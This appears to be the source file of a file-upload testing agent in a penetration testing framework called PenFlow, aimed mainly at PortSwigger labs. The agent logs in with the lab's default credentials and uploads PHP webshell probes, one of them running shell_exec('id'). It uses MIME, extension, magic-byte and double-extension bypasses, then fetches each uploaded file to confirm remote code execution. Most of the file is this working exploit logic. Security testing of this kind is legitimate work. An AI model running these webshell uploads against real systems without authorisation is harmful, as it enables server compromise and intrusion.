"""
FileUploadCapabilityAgent — Dangerous File Upload Bypass Detection for PenFlow.

Tests file upload endpoints for:
  1. Content-Type bypass (send PHP/ASP with image MIME type)
  2. File extension bypass (.php5, .phtml, .Php, .pHp)
  3. Magic bytes bypass (prepend GIF89a to PHP webshell)
  4. Null byte injection (file.php%00.jpg)
  5. Double extension bypass (file.jpg.php)
  6. Web shell upload and RCE confirmation via uploaded file execution

For PortSwigger labs: targets /my-account/avatar and similar multipart POST forms.
"""
import re
from typing import List, Dict, Any, Optional
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.capabilities.result import AgentExecutionResult
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.file_upload")

# ─────────────────────────────────────────────────────────
# Web Shell Payloads
# ─────────────────────────────────────────────────────────
PHP_WEBSHELL = "<?php echo 'PENFLOW_RCE_' . shell_exec('id') . '_END'; ?>"
PHP_SIMPLE_PROBE = "<?php echo 'PENFLOW_PROBE_8675309'; ?>"
PHP_MAGIC_PROBE = "GIF89a\n<?php echo 'PENFLOW_PROBE_8675309'; ?>"

RCE_MARKER = "PENFLOW_RCE_"
PROBE_MARKER = "PENFLOW_PROBE_8675309"

FILE_UPLOAD_PROBES = [
    {
        "name": "php_content_type_bypass",
        "filename": "exploit.php",
        "content": PHP_SIMPLE_PROBE,
        "content_type": "image/jpeg",
        "description": "PHP webshell with image/jpeg Content-Type bypass",
        "severity": "critical",
    },
    {
        "name": "php5_extension_bypass",
        "filename": "exploit.php5",
        "content": PHP_SIMPLE_PROBE,
        "content_type": "image/png",
        "description": ".php5 extension bypass (not blocked by many filters)",
        "severity": "critical",
    },
    {
        "name": "phtml_extension_bypass",
        "filename": "exploit.phtml",
        "content": PHP_SIMPLE_PROBE,
        "content_type": "image/gif",
        "description": ".phtml extension bypass",
        "severity": "critical",
    },
    {
        "name": "case_insensitive_php",
        "filename": "exploit.pHp",
        "content": PHP_SIMPLE_PROBE,
        "content_type": "image/jpeg",
        "description": "Case-insensitive .pHp extension bypass",
        "severity": "critical",
    },
    {
        "name": "magic_bytes_bypass",
        "filename": "exploit.php",
        "content": PHP_MAGIC_PROBE,
        "content_type": "image/gif",
        "description": "GIF magic bytes prepended to PHP webshell (bypasses magic byte validation)",
        "severity": "critical",
    },
    {
        "name": "double_extension_bypass",
        "filename": "exploit.jpg.php",
        "content": PHP_SIMPLE_PROBE,
        "content_type": "image/jpeg",
        "description": "Double extension .jpg.php bypass",
        "severity": "high",
    },
    {
        "name": "legitimate_jpg_probe",
        "filename": "penflow_test.jpg",
        "content": "\xff\xd8\xff\xe0" + "PENFLOW_LEGIT_PROBE",
        "content_type": "image/jpeg",
        "description": "Legitimate JPEG upload (baseline/control)",
        "severity": "info",
    },
]


class FileUploadCapabilityAgent(BaseCapabilityAgent):
    """
    File Upload Security Specialist Capability Agent.

    Tests upload endpoints for:
    - MIME type / Content-Type bypass attacks
    - Extension filter evasion (.php5, .phtml, case variants)
    - Magic bytes bypass (GIF89a prefix on PHP payloads)
    - Double extension attacks
    - Web shell execution confirmation by fetching uploaded file URL
    """

    def __init__(self, priority: int = 9):
        super().__init__(agent_name="FileUploadCapabilityAgent", priority=priority)

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="file_upload_bypass",
                name="Dangerous File Upload Bypass & RCE",
                description=(
                    "Tests file upload endpoints for Content-Type bypass, extension filter evasion, "
                    "magic bytes bypass, and web shell upload with execution confirmation."
                ),
                priority=self.priority,
                tags=["file_upload", "rce", "bypass", "webshell", "critical"],
            ),
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[FileUploadCapabilityAgent] Executing '{capability_id}' on '{context.asset}'")

        http_client = context.get_http_client()
        findings: List[Dict[str, Any]] = []
        evidence_exchanges: List[Dict[str, Any]] = []

        # Discover upload endpoints from crawl observations
        upload_endpoints = self._collect_upload_endpoints(context)

        for endpoint in upload_endpoints[:5]:
            action_url = endpoint.get("url", "")
            file_param = endpoint.get("file_param", "avatar")

            if not action_url:
                continue

            # Run upload probes against each endpoint
            for probe in FILE_UPLOAD_PROBES:
                finding = await self._test_file_upload(
                    http_client, action_url, file_param, probe, context
                )
                if finding:
                    evidence_exchanges.extend(finding.get("exchanges", []))
                    if finding.get("is_vulnerable"):
                        findings.append(finding)
                        logger.info(
                            f"[FileUploadCapabilityAgent] CONFIRMED: {probe['name']} "
                            f"succeeded on {action_url}"
                        )
                        break  # Stop after first confirmed bypass per endpoint

        confirmed = [f for f in findings if f.get("is_vulnerable")]
        is_vuln = len(confirmed) > 0
        best = confirmed[0] if confirmed else {}

        return AgentExecutionResult(
            agent=self.name,
            capability=capability_id,
            asset=context.asset,
            status="COMPLETED",
            is_vulnerable=is_vuln,
            confidence_score=best.get("confidence", 0.0),
            reasoning=best.get("reasoning", "No file upload bypass confirmed. Server validates uploads correctly."),
            target_url=best.get("upload_url", f"https://{context.asset}"),
            findings=findings,
            evidence={
                "target_url": best.get("upload_url", f"https://{context.asset}"),
                "reasoning": best.get("reasoning", "No file upload bypass confirmed."),
                "technique": best.get("probe_name", ""),
                "uploaded_file_url": best.get("uploaded_file_url", ""),
                "findings": findings,
                "evidence_exchanges": evidence_exchanges,
            },
        ).to_dict()

    def _collect_upload_endpoints(self, context: CapabilityExecutionContext) -> List[Dict[str, Any]]:
        """Discover file upload endpoints from crawler observations."""
        endpoints = []
        seen = set()

        for data in context.get_observation_data():
            if not isinstance(data, dict):
                continue

            # Check discovered forms for file upload inputs
            for form in data.get("forms", []):
                if not isinstance(form, dict):
                    continue
                action = form.get("action", "")
                enc = form.get("enctype", "") or ""
                params = form.get("parameters", []) or []

                # Detect file upload forms via enctype or file input names
                is_upload_form = (
                    "multipart" in enc.lower()
                    or any(p in str(params).lower() for p in ["avatar", "file", "upload", "image", "attachment"])
                )
                if is_upload_form and action and action not in seen:
                    file_param = next(
                        (p for p in params if any(k in str(p).lower() for k in ["avatar", "file", "upload", "image"])),
                        "avatar"
                    )
                    endpoints.append({"url": action, "file_param": file_param})
                    seen.add(action)

            # Direct endpoint URLs containing upload keywords
            for ep in data.get("endpoints", []):
                if not isinstance(ep, dict):
                    continue
                url = ep.get("url", "")
                if any(kw in url.lower() for kw in ["/upload", "avatar", "attachment", "file"]):
                    if url not in seen:
                        endpoints.append({"url": url, "file_param": "avatar"})
                        seen.add(url)

            # Direct url in observation
            url = data.get("url", "")
            if url and any(kw in url.lower() for kw in ["/upload", "avatar", "/file"]):
                if url not in seen:
                    endpoints.append({"url": url, "file_param": "avatar"})
                    seen.add(url)

        # Fallback: try common upload paths if nothing found
        if not endpoints:
            base = f"https://{context.asset}"
            for path in ["/my-account/avatar", "/upload", "/api/upload", "/profile/avatar"]:
                endpoints.append({"url": f"{base}{path}", "file_param": "avatar"})

        return endpoints

    async def _test_file_upload(
        self,
        http_client: Any,
        upload_url: str,
        file_param: str,
        probe: Dict[str, Any],
        context: CapabilityExecutionContext,
    ) -> Optional[Dict[str, Any]]:
        """
        Attempt to upload a malicious file using the given probe strategy.
        Then attempt to fetch the uploaded file URL to confirm execution.
        """
        probe_name = probe["name"]
        filename = probe["filename"]
        file_content = probe["content"]
        content_type = probe["content_type"]

        # Skip baseline probe — it's just a control, not a vulnerability test
        if probe_name == "legitimate_jpg_probe":
            return None

        # Fetch upload form page first to extract CSRF token and hidden fields (e.g. csrf, user)
        extra_fields = {}
        cookies_to_use = {}
        try:
            get_exch = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method="GET",
                url=upload_url
            )
            get_html = (get_exch.response.body_text or "") if get_exch and get_exch.response else ""

            # Check if upload endpoint redirected to /login or requires authentication
            if ("name=\"username\"" in get_html.lower() or "/login" in upload_url or "my-account" in upload_url) and "my-account" in upload_url:
                base_origin = "/".join(upload_url.split("/")[:3])
                login_url = f"{base_origin}/login"
                login_get = await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=login_url)
                if login_get and login_get.response:
                    login_html = login_get.response.body_text or ""
                    csrf_m = re.search(r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']', login_html, re.IGNORECASE) or \
                             re.search(r'value=["\']([^"\']+)["\']\s+name=["\']csrf["\']', login_html, re.IGNORECASE)
                    login_csrf = csrf_m.group(1) if csrf_m else ""
                    # Login as standard portswigger lab user wiener / peter
                    await http_client.send_as_identity(
                        identity_id="anonymous_guest",
                        method="POST",
                        url=login_url,
                        body=f"csrf={login_csrf}&username=wiener&password=peter",
                        headers={"Content-Type": "application/x-www-form-urlencoded"}
                    )
                    # Re-fetch upload URL after login
                    get_exch = await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=upload_url)
                    get_html = (get_exch.response.body_text or "") if get_exch and get_exch.response else ""

            # Extract CSRF token
            csrf_match = re.search(r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']', get_html, re.IGNORECASE) or \
                         re.search(r'value=["\']([^"\']+)["\']\s+name=["\']csrf["\']', get_html, re.IGNORECASE)
            if csrf_match:
                extra_fields["csrf"] = csrf_match.group(1)

            # Extract hidden user field
            user_match = re.search(r'name=["\']user["\']\s+value=["\']([^"\']+)["\']', get_html, re.IGNORECASE) or \
                         re.search(r'value=["\']([^"\']+)["\']\s+name=["\']user["\']', get_html, re.IGNORECASE)
            if user_match:
                extra_fields["user"] = user_match.group(1)
        except Exception as e:
            logger.debug(f"[FileUploadCapabilityAgent] Pre-fetch form error on {upload_url}: {e}")

        # Build multipart upload request body with boundary and all fields
        boundary = "---------------------------PenFlowBoundary8675309"
        body_parts = []
        for f_name, f_val in extra_fields.items():
            body_parts.append(
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{f_name}"\r\n\r\n'
                f"{f_val}\r\n"
            )
        body_parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{file_param}"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n"
            f"{file_content}\r\n"
        )
        body_parts.append(f"--{boundary}--\r\n")
        multipart_body = "".join(body_parts)

        try:
            upload_exchange = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method="POST",
                url=upload_url,
                body=multipart_body,
                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            )
        except Exception as e:
            logger.debug(f"[FileUploadCapabilityAgent] Upload request failed for '{probe_name}': {e}")
            return None

        if not upload_exchange:
            return None

        upload_resp = upload_exchange.response
        upload_status = upload_resp.status_code if upload_resp else 0
        upload_body = (upload_resp.body_text or "") if upload_resp else ""

        exchanges = [upload_exchange.to_dict()]

        # Check if upload was rejected (4xx = likely blocked)
        if upload_status >= 400:
            logger.debug(f"[FileUploadCapabilityAgent] Probe '{probe_name}' rejected with HTTP {upload_status}")
            return {
                "probe_name": probe_name,
                "upload_url": upload_url,
                "is_vulnerable": False,
                "confidence": 0.0,
                "reasoning": f"Upload rejected with HTTP {upload_status} — server blocked '{filename}' ({content_type}).",
                "exchanges": exchanges,
            }

        # Upload accepted — extract the URL of the uploaded file from response, or probe standard paths
        uploaded_file_url = self._extract_uploaded_file_url(upload_body, upload_exchange, context.asset)
        candidate_file_urls = []
        if uploaded_file_url:
            candidate_file_urls.append(uploaded_file_url)

        base = f"https://{context.asset}"
        candidate_file_urls.extend([
            f"{base}/files/avatars/{filename}",
            f"{base}/files/{filename}",
            f"{base}/avatar/{filename}",
            f"{base}/uploads/{filename}",
        ])

        # Attempt to fetch uploaded file to confirm PHP execution
        execution_confirmed = False
        fetch_exchange = None
        confirmed_url = None

        for check_url in candidate_file_urls:
            try:
                fetch_exchange = await http_client.send_as_identity(
                    identity_id="anonymous_guest",
                    method="GET",
                    url=check_url,
                )
                fetch_resp = fetch_exchange.response
                fetch_body = (fetch_resp.body_text or "") if fetch_resp else ""
                fetch_status = fetch_resp.status_code if fetch_resp else 0

                if fetch_status == 200:
                    exchanges.append(fetch_exchange.to_dict())
                    # Check if PHP was executed (probe marker appears in output without PHP tags)
                    if PROBE_MARKER in fetch_body or RCE_MARKER in fetch_body:
                        execution_confirmed = True
                        confirmed_url = check_url
                        logger.info(
                            f"[FileUploadCapabilityAgent] 🔴 RCE CONFIRMED via '{probe_name}': "
                            f"PHP executed at {check_url}"
                        )
                        break
            except Exception as e:
                logger.debug(f"[FileUploadCapabilityAgent] Failed to fetch uploaded file from {check_url}: {e}")

        uploaded_file_url = confirmed_url or uploaded_file_url

        # Determine vulnerability status
        if execution_confirmed:
            return {
                "probe_name": probe_name,
                "upload_url": upload_url,
                "uploaded_file_url": uploaded_file_url,
                "filename": filename,
                "content_type_used": content_type,
                "is_vulnerable": True,
                "confidence": 0.99,
                "severity": "CRITICAL",
                "reasoning": (
                    f"CRITICAL Remote Code Execution: File '{filename}' uploaded successfully using "
                    f"'{probe_name}' technique. PHP code executed at {uploaded_file_url}. "
                    f"Probe marker '{PROBE_MARKER}' confirmed in server response."
                ),
                "exchanges": exchanges,
            }
        elif upload_status < 400:
            # Upload accepted but can't confirm execution (no URL or PHP not executed)
            return {
                "probe_name": probe_name,
                "upload_url": upload_url,
                "uploaded_file_url": uploaded_file_url or "",
                "filename": filename,
                "content_type_used": content_type,
                "is_vulnerable": False,
                "confidence": 0.5,
                "reasoning": (
                    f"File '{filename}' accepted by server (HTTP {upload_status}) using '{probe_name}' technique, "
                    f"but PHP execution could not be confirmed at uploaded URL "
                    f"{'(URL not found in response)' if not uploaded_file_url else uploaded_file_url}. "
                    f"Manual verification recommended."
                ),
                "exchanges": exchanges,
            }

        return None

    def _extract_uploaded_file_url(
        self, response_body: str, exchange: Any, asset: str
    ) -> Optional[str]:
        """
        Extract the URL of the uploaded file from the upload response.
        Tries JSON 'url'/'filename' fields and HTML href/src attributes.
        """
        import json

        # Try JSON response
        try:
            data = json.loads(response_body)
            for key in ["url", "file_url", "location", "path", "filename", "file"]:
                if key in data and isinstance(data[key], str):
                    url = data[key]
                    if not url.startswith("http"):
                        url = f"https://{asset}{url}"
                    return url
        except Exception:
            pass

        # Try extracting from HTML (src/href attributes with upload-related paths)
        patterns = [
            r'src=["\']([^"\']*(?:upload|files|avatar|profile)[^"\']*)["\']',
            r'href=["\']([^"\']*(?:upload|files|avatar|profile)[^"\']*)["\']',
            r'"url"\s*:\s*"([^"]+)"',
            r'The file\s+([^"\']*(?:avatar|files|uploads)[^"\']*)\s+has been uploaded',
            r'avatars/([a-zA-Z0-9_\-\.]+)',
        ]
        for pattern in patterns:
            m = re.search(pattern, response_body, re.IGNORECASE)
            if m:
                extracted = m.group(1)
                if not extracted.startswith("/") and not extracted.startswith("http"):
                    extracted = f"/files/avatars/{extracted}"
                url = extracted if extracted.startswith("http") else f"https://{asset}{extracted}"
                return url

        # Try Location header from redirect
        try:
            if hasattr(exchange, "response") and exchange.response:
                headers = exchange.response.headers or {}
                location = headers.get("Location") or headers.get("location", "")
                if location:
                    if not location.startswith("http"):
                        location = f"https://{asset}{location}"
                    return location
        except Exception:
            pass

        return None
